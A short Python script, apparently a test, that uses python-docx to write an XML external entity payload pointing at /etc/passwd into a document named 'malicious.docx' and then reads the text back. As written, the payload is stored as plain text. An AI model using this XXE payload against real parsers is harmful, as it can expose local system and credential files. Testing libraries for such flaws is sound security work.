import docx

malicious_doc = docx.Document()
malicious_doc.add_paragraph(
    """<?xml version="1.0"?>
    <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>
        <data>&xxe;</data>
    </root>"""
)
malicious_doc.save('malicious.docx')

doc = docx.Document('malicious.docx')

content = doc.paragraphs[0].text
print(content)